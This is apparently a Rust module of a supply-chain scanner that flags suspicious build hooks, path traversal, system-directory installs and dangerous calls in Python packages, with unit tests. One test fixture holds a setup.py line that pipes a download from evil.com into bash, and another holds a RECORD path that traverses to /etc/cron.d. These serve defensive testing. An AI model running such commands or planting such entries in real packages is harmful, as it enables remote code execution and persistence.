//! pip build hook inspection
//!
//! Scans Python packages for suspicious build hooks, unusual file installations,
//! and dangerous patterns in setup.py / pyproject.toml files that could indicate
//! supply chain compromise.

use crate::checks::SupplyChainCheck;
use crate::types::SupplyChainContext;
use protectinator_container::filesystem::ContainerFs;
use protectinator_core::{Finding, FindingSource, Severity};
use tracing::debug;
use walkdir::WalkDir;

/// Known legitimate build backends in pyproject.toml [build-system]
const KNOWN_BUILD_BACKENDS: &[&str] = &[
    "setuptools",
    "flit",
    "flit_core",
    "hatchling",
    "hatch",
    "poetry",
    "poetry.core",
    "poetry-core",
    "maturin",
    "pdm",
    "pdm-backend",
    "pdm.backend",
    "scikit-build",
    "scikit_build",
    "mesonpy",
    "meson-python",
    "whey",
    "enscons",
    "jupyter_packaging",
    "sipbuild",
    "cx_freeze",
];

/// Dangerous patterns in setup.py files
const SETUP_PY_DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    ("os.system(", "os.system() call"),
    ("subprocess.call(", "subprocess.call() call"),
    ("subprocess.run(", "subprocess.run() call"),
    ("subprocess.Popen(", "subprocess.Popen() call"),
    ("exec(", "exec() call"),
    ("eval(", "eval() call"),
    ("__import__(", "__import__() call"),
    ("os.popen(", "os.popen() call"),
    ("commands.getoutput(", "commands.getoutput() call"),
];

/// Python site-packages directory patterns to search
const SITE_PACKAGES_PATTERNS: &[(&str, &str)] = &[
    ("/usr/lib", "dist-packages"),
    ("/usr/lib", "site-packages"),
    ("/usr/local/lib", "dist-packages"),
    ("/usr/local/lib", "site-packages"),
];

/// Checks Python packages for suspicious build hooks and installation anomalies
pub struct PipBuildHooksCheck;

impl SupplyChainCheck for PipBuildHooksCheck {
    fn id(&self) -> &str {
        "supply-chain-pip-build-hooks"
    }

    fn name(&self) -> &str {
        "pip Build Hook Inspection"
    }

    fn run(&self, fs: &ContainerFs, ctx: &SupplyChainContext) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Phase 1: Check installed packages via dist-info RECORD files
        let site_dirs = discover_site_packages(fs, ctx);
        for dir in &site_dirs {
            check_dist_info_records(fs, dir, &mut findings);
        }

        // Phase 2: Scan pyproject.toml files under ctx.root for build config issues
        let fs_root = fs.root().to_path_buf();
        for entry in WalkDir::new(&fs_root)
            .max_depth(4)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            let Some(name) = entry.file_name().to_str() else {
                continue;
            };

            if name == "pyproject.toml" && entry.file_type().is_file() {
                let path = entry.path();
                let display_path = path
                    .strip_prefix(&fs_root)
                    .map(|p| format!("/{}", p.display()))
                    .unwrap_or_else(|_| path.display().to_string());

                if let Ok(content) = std::fs::read_to_string(path) {
                    check_pyproject_toml(&display_path, &content, &mut findings);
                }
            }

            if name == "setup.py" && entry.file_type().is_file() {
                let path = entry.path();
                let display_path = path
                    .strip_prefix(&fs_root)
                    .map(|p| format!("/{}", p.display()))
                    .unwrap_or_else(|_| path.display().to_string());

                // Skip node_modules and .git
                if display_path.contains("node_modules") || display_path.contains(".git/") {
                    continue;
                }

                if let Ok(content) = std::fs::read_to_string(path) {
                    check_setup_py(&display_path, &content, &mut findings);
                }
            }
        }

        findings
    }
}

/// Discover Python site-packages directories on the filesystem
fn discover_site_packages(fs: &ContainerFs, ctx: &SupplyChainContext) -> Vec<String> {
    let mut dirs = Vec::new();

    for (base, subdir) in SITE_PACKAGES_PATTERNS {
        find_python_dirs(fs, base, subdir, &mut dirs);
    }

    for home in &ctx.user_homes {
        let home_str = home.display().to_string();
        let base = format!("{}/.local/lib", home_str);
        find_python_dirs(fs, &base, "site-packages", &mut dirs);
    }

    dirs
}

/// Find pythonX.Y directories under a base path
fn find_python_dirs(fs: &ContainerFs, base: &str, subdir: &str, dirs: &mut Vec<String>) {
    let Ok(entries) = fs.read_dir(base) else {
        return;
    };

    for entry in entries.flatten() {
        let Some(name) = entry.file_name().to_str().map(|s| s.to_string()) else {
            continue;
        };
        if name.starts_with("python") && entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            let candidate = format!("{}/{}/{}", base, name, subdir);
            if fs.exists(&candidate) {
                dirs.push(candidate);
            }
        }
    }
}

/// Check .dist-info/RECORD files for unusual file installations
fn check_dist_info_records(fs: &ContainerFs, site_dir: &str, findings: &mut Vec<Finding>) {
    let Ok(entries) = fs.read_dir(site_dir) else {
        return;
    };

    for entry in entries.flatten() {
        let Some(name) = entry.file_name().to_str().map(|s| s.to_string()) else {
            continue;
        };

        if !name.ends_with(".dist-info") {
            continue;
        }

        let pkg_name = name.trim_end_matches(".dist-info");
        // Strip version from name: "package-1.0.0.dist-info" -> "package"
        let pkg_base = pkg_name
            .rsplit_once('-')
            .map(|(name, _ver)| name)
            .unwrap_or(pkg_name);

        let record_path = format!("{}/{}/RECORD", site_dir, name);
        let Ok(record_content) = fs.read_to_string(&record_path) else {
            continue;
        };

        let entry_points_path = format!("{}/{}/entry_points.txt", site_dir, name);
        let entry_points_content = fs.read_to_string(&entry_points_path).ok();

        // Check RECORD entries
        for line in record_content.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }

            // RECORD format: path,hash,size
            let file_path = trimmed.split(',').next().unwrap_or("");
            if file_path.is_empty() {
                continue;
            }

            // Check for path traversal
            if file_path.contains("../") {
                findings.push(
                    Finding::new(
                        format!("supply-chain-pip-path-traversal-{}", sanitize(pkg_base)),
                        format!("Path traversal in package RECORD: {}", pkg_base),
                        format!(
                            "Package \"{}\" installs files using relative path traversal: {}. \
                             This could place files outside the expected package directory.",
                            pkg_base, file_path
                        ),
                        Severity::Critical,
                        make_source(),
                    )
                    .with_resource(&record_path)
                    .with_remediation(format!(
                        "Remove the package \"{}\" and inspect what files it installed. \
                         Path traversal in package records is a strong supply chain attack indicator.",
                        pkg_base
                    ))
                    .with_metadata("package", serde_json::json!(pkg_base))
                    .with_metadata("suspicious_path", serde_json::json!(file_path)),
                );
            }

            // Check for files installed outside the package directory
            // Installed .pth files are suspicious (covered by pth_injection check, but worth noting)
            if file_path.ends_with(".pth") {
                findings.push(
                    Finding::new(
                        format!(
                            "supply-chain-pip-pth-install-{}-{}",
                            sanitize(pkg_base),
                            sanitize(file_path)
                        ),
                        format!("Package installs .pth file: {}", pkg_base),
                        format!(
                            "Package \"{}\" installs a .pth file ({}). These files execute \
                             code on every Python startup.",
                            pkg_base, file_path
                        ),
                        Severity::Medium,
                        make_source(),
                    )
                    .with_resource(&record_path)
                    .with_metadata("package", serde_json::json!(pkg_base))
                    .with_metadata("pth_file", serde_json::json!(file_path)),
                );
            }

            // Check for installations to system directories outside site-packages
            if file_path.starts_with("/usr/bin/")
                || file_path.starts_with("/usr/sbin/")
                || file_path.starts_with("/etc/")
                || file_path.contains("/.config/")
            {
                findings.push(
                    Finding::new(
                        format!(
                            "supply-chain-pip-external-install-{}-{}",
                            sanitize(pkg_base),
                            sanitize(file_path)
                        ),
                        format!("Package installs files outside site-packages: {}", pkg_base),
                        format!(
                            "Package \"{}\" installs files to a system directory: {}. \
                             This is unusual for a Python package.",
                            pkg_base, file_path
                        ),
                        Severity::High,
                        make_source(),
                    )
                    .with_resource(&record_path)
                    .with_remediation(format!(
                        "Verify that the files installed by \"{}\" to {} are expected. \
                         Most Python packages should only install within site-packages.",
                        pkg_base, file_path
                    ))
                    .with_metadata("package", serde_json::json!(pkg_base))
                    .with_metadata("installed_path", serde_json::json!(file_path)),
                );
            }
        }

        // Check entry_points.txt for unusual console_scripts
        if let Some(ep_content) = &entry_points_content {
            check_entry_points(pkg_base, &entry_points_path, ep_content, findings);
        }
    }
}

/// Check entry_points.txt for suspicious console_scripts
fn check_entry_points(
    pkg_name: &str,
    ep_path: &str,
    content: &str,
    findings: &mut Vec<Finding>,
) {
    let mut in_console_scripts = false;

    for line in content.lines() {
        let trimmed = line.trim();

        if trimmed == "[console_scripts]" {
            in_console_scripts = true;
            continue;
        }

        // New section header ends console_scripts section
        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            in_console_scripts = false;
            continue;
        }

        if !in_console_scripts || trimmed.is_empty() {
            continue;
        }

        // entry_points format: "command = module:function"
        if let Some((_cmd, target)) = trimmed.split_once('=') {
            let target = target.trim();
            // Flag if the target points to a suspicious location
            if target.contains("/tmp/")
                || target.contains("/dev/shm/")
                || target.contains("..:")
            {
                findings.push(
                    Finding::new(
                        format!(
                            "supply-chain-pip-suspicious-entrypoint-{}",
                            sanitize(pkg_name)
                        ),
                        format!(
                            "Suspicious console_script entry point in {}",
                            pkg_name
                        ),
                        format!(
                            "Package \"{}\" defines a console_script pointing to a \
                             suspicious target: {}",
                            pkg_name, target
                        ),
                        Severity::High,
                        make_source(),
                    )
                    .with_resource(ep_path)
                    .with_metadata("package", serde_json::json!(pkg_name))
                    .with_metadata("entry_point", serde_json::json!(trimmed)),
                );
            }
        }
    }
}

/// Check pyproject.toml for suspicious build configuration
fn check_pyproject_toml(path: &str, content: &str, findings: &mut Vec<Finding>) {
    let Ok(parsed) = content.parse::<toml::Value>() else {
        debug!("Failed to parse pyproject.toml at {}", path);
        return;
    };

    // Check [build-system] requires for unusual build backends
    if let Some(build_system) = parsed.get("build-system") {
        if let Some(requires) = build_system.get("requires").and_then(|v| v.as_array()) {
            let has_known_backend = requires.iter().any(|req| {
                let s = req.as_str().unwrap_or("");
                KNOWN_BUILD_BACKENDS.iter().any(|&known| {
                    // Match "setuptools>=42" as starting with "setuptools"
                    let base = s.split(&['>', '<', '=', '!', '~', '['][..]).next().unwrap_or("");
                    let base = base.trim().replace('-', "_");
                    let known_normalized = known.replace('-', "_");
                    base == known_normalized
                })
            });

            if !has_known_backend && !requires.is_empty() {
                let requires_str: Vec<_> = requires
                    .iter()
                    .filter_map(|v| v.as_str())
                    .collect();
                findings.push(
                    Finding::new(
                        format!(
                            "supply-chain-pip-unusual-backend-{}",
                            sanitize(path)
                        ),
                        format!("Unusual build backend in {}", path),
                        format!(
                            "The pyproject.toml at {} uses build requirements that don't match \
                             any known build backend: {:?}. This could indicate a typosquatting \
                             or trojanized build dependency.",
                            path, requires_str
                        ),
                        Severity::Medium,
                        make_source(),
                    )
                    .with_resource(path)
                    .with_remediation(
                        "Verify the build backend is legitimate. Common build backends are \
                         setuptools, flit, hatchling, poetry, maturin, and pdm.",
                    )
                    .with_metadata("requires", serde_json::json!(requires_str)),
                );
            }
        }

        // Check build-backend field
        if let Some(backend) = build_system
            .get("build-backend")
            .and_then(|v| v.as_str())
        {
            let backend_base = backend
                .split('.')
                .next()
                .unwrap_or(backend)
                .replace('-', "_");
            let is_known = KNOWN_BUILD_BACKENDS.iter().any(|&known| {
                let known_normalized = known.replace('-', "_");
                backend_base == known_normalized
            });

            if !is_known {
                findings.push(
                    Finding::new(
                        format!(
                            "supply-chain-pip-unusual-build-backend-{}",
                            sanitize(path)
                        ),
                        format!("Unknown build backend in {}", path),
                        format!(
                            "The pyproject.toml at {} specifies an unrecognized build backend: \"{}\". \
                             This may indicate a supply chain attack via a trojanized build tool.",
                            path, backend
                        ),
                        Severity::Medium,
                        make_source(),
                    )
                    .with_resource(path)
                    .with_metadata("build_backend", serde_json::json!(backend)),
                );
            }
        }
    }

    // Check [tool.setuptools.cmdclass] for custom command overrides
    if let Some(tool) = parsed.get("tool") {
        if let Some(setuptools) = tool.get("setuptools") {
            if let Some(cmdclass) = setuptools.get("cmdclass") {
                if let Some(table) = cmdclass.as_table() {
                    for (cmd, target) in table {
                        findings.push(
                            Finding::new(
                                format!(
                                    "supply-chain-pip-cmdclass-{}-{}",
                                    sanitize(path),
                                    sanitize(cmd)
                                ),
                                format!(
                                    "Custom setuptools command override in {}",
                                    path
                                ),
                                format!(
                                    "The pyproject.toml at {} overrides the \"{}\" setuptools command \
                                     class with \"{}\". Custom command classes can execute arbitrary \
                                     code during package build/install.",
                                    path,
                                    cmd,
                                    target
                                ),
                                Severity::Medium,
                                make_source(),
                            )
                            .with_resource(path)
                            .with_metadata("command", serde_json::json!(cmd))
                            .with_metadata("target", serde_json::json!(target.to_string())),
                        );
                    }
                }
            }
        }
    }
}

/// Check setup.py files for dangerous patterns
fn check_setup_py(path: &str, content: &str, findings: &mut Vec<Finding>) {
    for (pattern, description) in SETUP_PY_DANGEROUS_PATTERNS {
        if content.contains(pattern) {
            findings.push(
                Finding::new(
                    format!(
                        "supply-chain-pip-setup-py-{}-{}",
                        sanitize(description),
                        sanitize(path)
                    ),
                    format!("Dangerous pattern in setup.py: {}", path),
                    format!(
                        "The setup.py at {} contains {}: \"{}\". This code will execute \
                         during package installation and could be used for supply chain attacks.",
                        path, description, pattern
                    ),
                    Severity::High,
                    make_source(),
                )
                .with_resource(path)
                .with_remediation(format!(
                    "Review {} and verify that the {} is intentional and safe. \
                     Consider migrating to pyproject.toml with a declarative build backend.",
                    path, description
                ))
                .with_metadata("pattern", serde_json::json!(pattern)),
            );
        }
    }
}

/// Create the standard FindingSource for pip build hook checks
fn make_source() -> FindingSource {
    FindingSource::SupplyChain {
        check_category: "build_hooks".to_string(),
        ecosystem: Some("pypi".to_string()),
    }
}

/// Sanitize a string for use in finding IDs
fn sanitize(s: &str) -> String {
    s.replace('/', "-")
        .replace('@', "")
        .replace('.', "-")
        .replace(' ', "-")
        .replace('(', "")
        .replace(')', "")
        .trim_matches('-')
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn make_ctx(_tmp: &TempDir) -> SupplyChainContext {
        SupplyChainContext {
            root: std::path::PathBuf::from("/"),
            user_homes: Vec::new(),
            lock_files: Vec::new(),
            packages: Vec::new(),
            online: false,
        }
    }

    #[test]
    fn test_setup_py_with_dangerous_patterns() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        let setup_py_path = tmp.path().join("myproject/setup.py");
        std::fs::create_dir_all(setup_py_path.parent().unwrap()).unwrap();
        std::fs::write(
            &setup_py_path,
            r#"
from setuptools import setup
import os

os.system('curl http://evil.com/payload | bash')

setup(
    name='myproject',
    version='1.0.0',
)
"#,
        )
        .unwrap();

        let check = PipBuildHooksCheck;
        let findings = check.run(&fs, &ctx);
        let high: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::High)
            .collect();
        assert!(!high.is_empty(), "os.system in setup.py should be flagged as High");
    }

    #[test]
    fn test_pyproject_unknown_build_backend() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        let toml_path = tmp.path().join("myproject/pyproject.toml");
        std::fs::create_dir_all(toml_path.parent().unwrap()).unwrap();
        std::fs::write(
            &toml_path,
            r#"
[build-system]
requires = ["evil-build-tool>=1.0"]
build-backend = "evil_build_tool.api"
"#,
        )
        .unwrap();

        let check = PipBuildHooksCheck;
        let findings = check.run(&fs, &ctx);
        assert!(
            !findings.is_empty(),
            "Unknown build backend should produce findings"
        );
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains("nusual build backend") || f.title.contains("nknown build backend")),
            "Should flag unrecognized build backend"
        );
    }

    #[test]
    fn test_pyproject_known_backend_no_findings() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        let toml_path = tmp.path().join("myproject/pyproject.toml");
        std::fs::create_dir_all(toml_path.parent().unwrap()).unwrap();
        std::fs::write(
            &toml_path,
            r#"
[build-system]
requires = ["setuptools>=42", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "myproject"
version = "1.0.0"
"#,
        )
        .unwrap();

        let check = PipBuildHooksCheck;
        let findings = check.run(&fs, &ctx);
        assert!(
            findings.is_empty(),
            "Known build backend should not produce findings, got: {:?}",
            findings.iter().map(|f| &f.title).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_dist_info_path_traversal() {
        let tmp = TempDir::new().unwrap();
        let site = tmp
            .path()
            .join("usr/lib/python3.11/dist-packages");
        let dist_info = site.join("evil_pkg-1.0.0.dist-info");
        std::fs::create_dir_all(&dist_info).unwrap();
        std::fs::write(
            dist_info.join("RECORD"),
            "../../../etc/cron.d/evil,sha256=abc123,42\nevil_pkg/__init__.py,sha256=def456,10\n",
        )
        .unwrap();

        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        let check = PipBuildHooksCheck;
        let findings = check.run(&fs, &ctx);
        let critical: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::Critical)
            .collect();
        assert!(
            !critical.is_empty(),
            "Path traversal in RECORD should be Critical"
        );
    }

    #[test]
    fn test_dist_info_external_install() {
        let tmp = TempDir::new().unwrap();
        let site = tmp
            .path()
            .join("usr/lib/python3.11/dist-packages");
        let dist_info = site.join("backdoor-0.1.0.dist-info");
        std::fs::create_dir_all(&dist_info).unwrap();
        std::fs::write(
            dist_info.join("RECORD"),
            "/usr/bin/sneaky-helper,sha256=abc123,4096\nbackdoor/__init__.py,sha256=def456,10\n",
        )
        .unwrap();

        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        let check = PipBuildHooksCheck;
        let findings = check.run(&fs, &ctx);
        let high: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::High)
            .collect();
        assert!(
            !high.is_empty(),
            "Files installed to /usr/bin/ should be High"
        );
    }
}
